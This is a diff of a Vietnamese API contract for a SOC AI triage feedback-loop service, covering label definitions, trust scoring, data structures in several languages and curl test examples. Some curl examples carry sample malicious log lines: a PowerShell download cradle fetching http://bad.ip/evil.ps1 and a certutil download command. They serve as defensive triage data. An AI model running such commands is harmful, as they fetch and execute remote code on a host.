@@ -1,41 +1,61 @@
 # SOC AI Triage — Feedback Loop API Contract (v4.0)
 
-> **Mục đích tài liệu:** Bản đặc tả API Contract này được thiết kế chi tiết, rõ ràng và chuẩn hóa để bạn có thể **gửi trực tiếp kèm theo prompt khi "vibe coding" ở bất kỳ hệ thống nào khác** (Frontend React/Vue, SOAR, SIEM, Case Management, Webhook Receiver, Discord/Slack Bot, Backend Microservices...). Agent ở hệ thống đó chỉ cần đọc file này là có thể tự động sinh mã nguồn tích hợp gọi chức năng Feedback Loop chính xác 100%.
+> **Mục đích tài liệu:** Bản đặc tả API Contract này được thiết kế chi tiết, rõ ràng và chuẩn hóa để bạn có thể **gửi trực tiếp kèm theo prompt khi "vibe coding" ở bất kỳ hệ thống nào khác** (Backend Golang, Node.js/TypeScript, Python, Frontend React/Vue, Case Management, SOAR, SIEM, Discord/Slack Bot...). Agent ở hệ thống đó chỉ cần đọc file này là có thể tự động sinh mã nguồn tích hợp gọi chức năng Feedback Loop chính xác 100%.
 
 ---
 
 ## 🤖 Prompt mẫu dành cho AI Agent khi Vibe Code ở hệ thống khác
 
-Nếu bạn dùng Cursor, Claude, ChatGPT, Copilot hoặc bất kỳ AI Agent nào để code hệ thống khác, hãy copy đoạn này gửi kèm:
+Nếu bạn dùng Cursor, Claude, ChatGPT, Copilot hoặc bất kỳ AI Agent nào để code hệ thống khác (ví dụ: Go, TypeScript, Python), hãy copy đoạn này gửi kèm:
 
 ```markdown
 Bạn là lập trình viên tích hợp hệ thống. Hãy đọc kỹ file API Contract này để hiện thực chức năng 
 gửi phản hồi (Feedback Loop) từ hệ thống của chúng ta sang SOC AI Triage Backend.
-- Đích gọi chính: POST /feedback (Gửi feedback trực tiếp theo log)
+- Đích gọi chính: POST /feedback (Gửi feedback trực tiếp theo từng raw log)
 - Đích gọi webhook (Case Management): POST /webhook/feedback (Gửi feedback theo case_id)
-- Hệ nhãn chuẩn hóa (Unified Labels): "TruePositive" | "FalsePositive" | "Benign" | "Suspicious"
-- Đảm bảo bắt và xử lý chính xác các HTTP status codes: 200, 422, 503, và lỗi kết nối mạng.
+- Bộ 4 nhãn chuẩn hóa bắt buộc (Unified Labels): 
+    "TruePositive" | "FalsePositive" | "Benign" | "Suspicious"
+  (Phân biệt hoa/thường, chuẩn PascalCase)
+- Bắt và xử lý chính xác các HTTP status codes: 200, 422, 503, và lỗi kết nối mạng.
 - Đối với POST /feedback: Hiển thị phản hồi trực quan gồm action (inserted/reinforced/corrected) và trust_score (1-5 sao).
 ```
 
 ---
 
-## 1. Tổng quan kiến trúc & Cơ chế hoạt động của Feedback Loop
+## 1. Tổng quan kiến trúc & Bộ 4 Label chuẩn hóa (Unified Labels)
 
 Feedback Loop là cơ chế **Active Learning (Human-in-the-Loop)** giúp hệ thống SOC AI liên tục tự học và cải thiện độ chính xác:
-1. Khi Chuyên viên phân tích SOC hoặc Hệ thống Quản lý Case (Case Management / SOAR) xác nhận hoặc sửa nhãn của một log/alert:
-   - **`TruePositive`:** Tấn công an ninh mạng thực sự, có mã độc, khai thác lỗ hổng hoặc hành vi xâm nhập.
-   - **`FalsePositive`:** Cảnh báo sai, nhầm lẫn do chữ ký luật, công cụ quét an ninh định kỳ hoặc lưu lượng bình thường bị gắn cờ nhầm.
-   - **`Benign`:** Hoạt động an toàn, bình thường, tác vụ quản trị hợp lệ đã được xác minh.
-   - **`Suspicious`:** Đáng ngờ, bất thường chưa đủ chứng cứ để kết luận tấn công, cần theo dõi thêm.
-2. Hệ thống backend sẽ:
+
+### 1.1 Quy ước Bộ 4 Label chuẩn hóa (`UnifiedLabel`)
+
+Toàn bộ hệ thống Backend AI Orchestrator đã chuyển dịch và chuẩn hóa hoàn toàn sang **4 nhãn** sau (PascalCase, chuỗi phân biệt hoa/thường):
+
+| Giá trị Nhãn (`label` / `verdict`) | Ý nghĩa nghiệp vụ SOC | Khi nào chuyên viên phân tích nên gán? |
+| :--- | :--- | :--- |
+| **`"TruePositive"`** | **Tấn công thực sự (Malicious)** | Khi phát hiện hành vi tấn công, mã độc, shell command bất thường, khai thác lỗ hổng hoặc xâm nhập mạng có thật. |
+| **`"FalsePositive"`** | **Cảnh báo sai (False Alarm)** | Khi hệ thống cảnh báo nhầm do chữ ký luật quá nhạy, công cụ scan an ninh định kỳ nội bộ, hoặc lưu lượng hợp lệ bị gán cờ nhầm. |
+| **`"Benign"`** | **Lành tính / An toàn (Safe)** | Hoạt động bình thường của người dùng hoặc tác vụ bảo trì, sao lưu hợp lệ của quản trị viên, hoàn toàn không có nguy cơ. |
+| **`"Suspicious"`** | **Đáng ngờ / Bất thường (Anomalous)** | Hành vi bất thường hoặc dấu hiệu lạ chưa đủ bằng chứng kết luận là tấn công nhưng cũng không thể khẳng định là an toàn, cần giám sát thêm. |
+
+> **Bảng đối chiếu chuyển đổi (Legacy Label Mapping):**
+> Nếu hệ thống bên ngoài của bạn từng dùng quy ước nhãn cũ (`TP`, `FP`, `Incident`):
+> - `TP` hoặc `Incident` ➔ Chuyển thành `"TruePositive"`
+> - `FP` ➔ Chuyển thành `"FalsePositive"`
+> - Các trường hợp bình thường đã xác minh ➔ Chuyển thành `"Benign"`
+> - Các cảnh báo cần thẩm tra thêm ➔ Chuyển thành `"Suspicious"`
+
+---
+
+### 1.2 Cơ chế Gradual Trust Scoring & Vector Deduplication
+
+1. Hệ thống backend sẽ:
    - Vector hóa log (`raw_log`) bằng mô hình embedding `nomic-ai/nomic-embed-text-v1.5` (768 chiều).
    - Tra cứu trong Vector Database (**Qdrant**) với ngưỡng tương đồng Cosine Similarity `0.92`.
    - **Ma trận quyết định Gradual Trust Scoring:**
      - **Không có log tương đồng ($\le 0.92$):** Tạo mới vector point (`action: "inserted"`, `trust_score: 1`).
      - **Có log tương đồng ($> 0.92$) & Cùng nhãn:** Tăng độ tin cậy (`action: "reinforced"`, `trust_score: min(hiện_tại + 1, 5)`).
      - **Có log tương đồng ($> 0.92$) & Khác nhãn:** Sửa lại nhãn theo analyst (`action: "corrected"`, ghi đè nhãn + comment, reset `trust_score: 1`).
-3. Các ca đã lưu feedback này sẽ được RAG (Retrieval-Augmented Generation) tự động nạp vào ngữ cảnh của LLM trong các lượt phân tích `/analyze` tiếp theo.
+2. Các ca đã lưu feedback này sẽ được RAG (Retrieval-Augmented Generation) tự động nạp vào ngữ cảnh của LLM trong các lượt phân tích `/analyze` tiếp theo.
 
 ```mermaid
 sequenceDiagram
@@ -88,7 +108,7 @@ Hệ thống backend đã được cấu hình **mở hoàn toàn (Fully Permiss
 
 ## 3. Liveness Check Endpoint (`GET /health`)
 
-Trước khi thực hiện tích hợp, client có thể thăm dò trạng thái kết nối tới SOC Backend:
+Trước khi thực hiện tích hợp hoặc định kỳ kiểm tra sức khỏe hệ thống:
 
 - **Method:** `GET`
 - **Path:** `/health`
@@ -128,7 +148,7 @@ Sử dụng endpoint này khi bạn có chuỗi log thô và muốn chuyên viê
 | Trường | Kiểu dữ liệu | Bắt buộc | Mặc định | Ràng buộc / Enum | Mô tả |
 | :--- | :--- | :---: | :---: | :--- | :--- |
 | `raw_log` | `string` | **Có** | — | `min_length >= 1` | Nội dung log thô cần lưu feedback (Syslog, Suricata, Windows Event, Firewall, JSON string...). |
-| `label` | `string` | **Có** | — | `"TruePositive"` \| `"FalsePositive"` \| `"Benign"` \| `"Suspicious"` | Nhãn đánh giá của chuyên viên phân tích. |
+| `label` | `string` | **Có** | — | `"TruePositive"` \| `"FalsePositive"` \| `"Benign"` \| `"Suspicious"` | **Bắt buộc** là 1 trong 4 nhãn chuẩn hóa. |
 | `analyst_comment` | `string` | Không | `""` | Chuỗi văn bản | Ghi chú, giải thích của chuyên viên phân tích (ví dụ: "IP scanner nội bộ đã xác minh", "Khai thác lỗ hổng Log4j"). |
 
 #### Ví dụ Request Body:
@@ -233,15 +253,71 @@ Sử dụng endpoint này khi hệ thống khác là **Case Management / SOAR** 
 
 | HTTP Code | Tên lỗi | Nguyên nhân | Cấu trúc Body | Hành động đề xuất cho Client |
 | :---: | :--- | :--- | :--- | :--- |
-| **`422`** | Unprocessable Entity | Dữ liệu gửi lên sai định dạng (thiếu `raw_log`, `raw_log` rỗng, hoặc `label` không nằm trong enum hợp lệ). | `{"detail": [{"loc": ["body", "label"], "msg": "Input should be 'TruePositive', 'FalsePositive', 'Benign' or 'Suspicious'", "type": "literal_error"}]}` | Kiểm tra và validate form input trước khi gửi request. |
+| **`422`** | Unprocessable Entity | Dữ liệu gửi lên sai định dạng (thiếu `raw_log`, `raw_log` rỗng, hoặc `label` không nằm trong 4 nhãn chuẩn hóa). | `{"detail": [{"loc": ["body", "label"], "msg": "Input should be 'TruePositive', 'FalsePositive', 'Benign' or 'Suspicious'", "type": "literal_error"}]}` | Kiểm tra và validate form input trước khi gửi request. |
 | **`503`** | Service Unavailable | Qdrant Vector DB gặp sự cố hoặc không ghi được dữ liệu. | `{"detail": "Vector DB write failed: <thông tin lỗi>"}` | Thông báo người dùng thử lại sau, hoặc kiểm tra `GET /health`. |
 | **`502` / `ConnectError`** | Bad Gateway / Network Error | Backend chưa bật hoặc sai cổng/IP mạng. | HTML/Text hoặc Network Exception từ thư viện HTTP | Kiểm tra lại URL backend và kết nối container/server. |
 
 ---
 
-## 7. TypeScript & Python Data Contracts (Dành cho Vibe Coding)
+## 7. Data Contracts (TypeScript, Python, Golang)
 
-### 7.1 TypeScript / JavaScript Interfaces
+### 7.1 Golang Structs & Enums (Dành cho Go Backend / `soc_feedback.go`)
+
+```go
+package handler
+
+// UnifiedLabel đại diện cho 4 nhãn chuẩn hóa của SOC AI Feedback Loop
+type UnifiedLabel string
+
+const (
+	LabelTruePositive  UnifiedLabel = "TruePositive"
+	LabelFalsePositive UnifiedLabel = "FalsePositive"
+	LabelBenign        UnifiedLabel = "Benign"
+	LabelSuspicious    UnifiedLabel = "Suspicious"
+)
+
+// FeedbackAction biểu thị hành động đã lưu trong Qdrant
+type FeedbackAction string
+
+const (
+	ActionInserted   FeedbackAction = "inserted"
+	ActionReinforced FeedbackAction = "reinforced"
+	ActionCorrected  FeedbackAction = "corrected"
+)
+
+// FeedbackRequest gửi tới POST /feedback
+type FeedbackRequest struct {
+	RawLog         string       `json:"raw_log"`
+	Label          UnifiedLabel `json:"label"`
+	AnalystComment string       `json:"analyst_comment,omitempty"`
+}
+
+// FeedbackResponse nhận về từ POST /feedback
+type FeedbackResponse struct {
+	Status     string         `json:"status"`
+	PointID    string         `json:"point_id"`
+	Action     FeedbackAction `json:"action"`
+	TrustScore int            `json:"trust_score"`
+}
+
+// WebhookFeedbackRequest gửi tới POST /webhook/feedback
+type WebhookFeedbackRequest struct {
+	CaseID     string       `json:"case_id"`
+	Verdict    UnifiedLabel `json:"verdict"`
+	Event      string       `json:"event,omitempty"`
+	FeedbackID string       `json:"feedback_id,omitempty"`
+	UserID     string       `json:"user_id,omitempty"`
+	Comment    string       `json:"comment,omitempty"`
+	CreatedAt  string       `json:"created_at,omitempty"`
+}
+
+// WebhookResponse nhận về từ POST /webhook/feedback
+type WebhookResponse struct {
+	Status string `json:"status"`
+}
+```
+
+### 7.2 TypeScript / JavaScript Interfaces
 
 ```typescript
 export type UnifiedLabel = "TruePositive" | "FalsePositive" | "Benign" | "Suspicious";
@@ -289,7 +365,7 @@ export interface HealthCheckResponse {
 }
 ```
 
-### 7.2 Python Pydantic Models
+### 7.3 Python Pydantic Models
 
 ```python
 from typing import Literal, Optional
@@ -322,14 +398,72 @@ class WebhookFeedbackRequest(BaseModel):
 
 ## 8. Code mẫu tích hợp sẵn sàng Copy-Paste
 
-### 8.1 TypeScript / JavaScript (Modern `fetch`)
+### 8.1 Golang (`net/http`)
+
+```go
+package main
+
+import (
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"time"
+)
+
+type UnifiedLabel string
+
+const (
+	LabelTruePositive  UnifiedLabel = "TruePositive"
+	LabelFalsePositive UnifiedLabel = "FalsePositive"
+	LabelBenign        UnifiedLabel = "Benign"
+	LabelSuspicious    UnifiedLabel = "Suspicious"
+)
+
+type FeedbackRequest struct {
+	RawLog         string       `json:"raw_log"`
+	Label          UnifiedLabel `json:"label"`
+	AnalystComment string       `json:"analyst_comment,omitempty"`
+}
+
+type FeedbackResponse struct {
+	Status     string `json:"status"`
+	PointID    string `json:"point_id"`
+	Action     string `json:"action"`
+	TrustScore int    `json:"trust_score"`
+}
+
+func SendFeedback(baseURL string, req FeedbackRequest) (*FeedbackResponse, error) {
+	jsonData, err := json.Marshal(req)
+	if err != nil {
+		return nil, fmt.Errorf("marshal request failed: %w", err)
+	}
+
+	client := &http.Client{Timeout: 30 * time.Second}
+	resp, err := client.Post(baseURL+"/feedback", "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return nil, fmt.Errorf("call feedback api failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("api returned status %d: %s", resp.StatusCode, string(body))
+	}
+
+	var fbResp FeedbackResponse
+	if err := json.Unmarshal(body, &fbResp); err != nil {
+		return nil, fmt.Errorf("unmarshal response failed: %w", err)
+	}
+
+	return &fbResp, nil
+}
+```
+
+### 8.2 TypeScript / JavaScript (Modern `fetch`)
 
 ```typescript
-/**
- * Gửi phản hồi phân loại log tới SOC AI Triage Backend
- * @param baseUrl URL của backend (ví dụ: 'http://localhost:8080')
- * @param payload Dữ liệu feedback
- */
 export async function submitSOCFeedback(
   baseUrl: string,
   payload: {
@@ -371,73 +505,48 @@ export async function submitSOCFeedback(
     trust_score: number;
   };
 }
-
-// ── Ví dụ gọi hàm:
-// submitSOCFeedback("http://localhost:8080", {
-//   raw_log: "Aug 22 14:33:12 fw01 kernel: DROP IN=eth0 ...",
-//   label: "FalsePositive",
-//   analyst_comment: "IP scan nội bộ đã được phê duyệt",
-// }).then((res) => {
-//   console.log("Feedback saved:", res.action, "Trust:", res.trust_score);
-// });
 ```
 
-### 8.2 Python (`httpx` / `requests`)
-
-```python
-import httpx
-
-def send_feedback(
-    base_url: str,
-    raw_log: str,
-    label: str,  # "TruePositive", "FalsePositive", "Benign", "Suspicious"
-    comment: str = "",
-    timeout: float = 30.0,
-) -> dict:
-    url = f"{base_url.rstrip('/')}/feedback"
-    payload = {
-        "raw_log": raw_log,
-        "label": label,
-        "analyst_comment": comment,
-    }
-    
-    with httpx.Client(timeout=timeout) as client:
-        resp = client.post(url, json=payload)
-        resp.raise_for_status()
-        return resp.json()
-
-# ── Ví dụ gọi hàm:
-# res = send_feedback(
-#     base_url="http://localhost:8080",
-#     raw_log="192.168.1.50 - - [12/Sep/2026:10:00:00 +0000] \"GET /admin/shell.php HTTP/1.1\" 404",
-#     label="TruePositive",
-#     comment="Webshell probing attack detected on perimeter",
-# )
-# print(f"Action: {res['action']} | Trust Score: {res['trust_score']}/5 | ID: {res['point_id']}")
-```
-
-### 8.3 cURL Command Test nhanh
+### 8.3 cURL Command Test nhanh cho cả 4 nhãn
 
 ```bash
-# 1. Gửi Feedback nhãn FalsePositive
-curl -X POST "http://localhost:8080/feedback" \
-     -H "Content-Type: application/json" \
-     -d '{
-       "raw_log": "Aug 22 14:33:12 fw01 kernel: DROP IN=eth0 OUT= SRC=203.0.113.42 DST=10.0.0.5 PROTO=TCP DPT=443",
-       "label": "FalsePositive",
-       "analyst_comment": "Whitelisted scanner IP"
-     }'
-
-# 2. Gửi Feedback nhãn TruePositive
+# 1. Feedback nhãn TruePositive (Tấn công thực sự)
 curl -X POST "http://localhost:8080/feedback" \
      -H "Content-Type: application/json" \
      -d '{
        "raw_log": "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\x27http://bad.ip/evil.ps1\x27))",
        "label": "TruePositive",
-       "analyst_comment": "PowerShell download cradle detected"
+       "analyst_comment": "PowerShell download cradle malware detected"
      }'
 
-# 3. Gửi Webhook Feedback từ Case Management
+# 2. Feedback nhãn FalsePositive (Cảnh báo sai)
+curl -X POST "http://localhost:8080/feedback" \
+     -H "Content-Type: application/json" \
+     -d '{
+       "raw_log": "Aug 22 14:33:12 fw01 kernel: DROP IN=eth0 OUT= SRC=203.0.113.42 DST=10.0.0.5 PROTO=TCP DPT=443",
+       "label": "FalsePositive",
+       "analyst_comment": "Whitelisted Nessus vulnerability scanner"
+     }'
+
+# 3. Feedback nhãn Benign (Lành tính / An toàn)
+curl -X POST "http://localhost:8080/feedback" \
+     -H "Content-Type: application/json" \
+     -d '{
+       "raw_log": "sshd[1245]: Accepted publickey for backup_admin from 192.168.1.100 port 52140 ssh2",
+       "label": "Benign",
+       "analyst_comment": "Automated backup cronjob running on schedule"
+     }'
+
+# 4. Feedback nhãn Suspicious (Đáng ngờ, cần thẩm tra)
+curl -X POST "http://localhost:8080/feedback" \
+     -H "Content-Type: application/json" \
+     -d '{
+       "raw_log": "cmd.exe /c certutil -urlcache -split -f http://unknown-domain.xyz/test.txt",
+       "label": "Suspicious",
+       "analyst_comment": "Certutil download unusual, pending investigation"
+     }'
+
+# 5. Gửi Webhook Feedback từ Case Management
 curl -X POST "http://localhost:8080/webhook/feedback" \
      -H "Content-Type: application/json" \
      -d '{
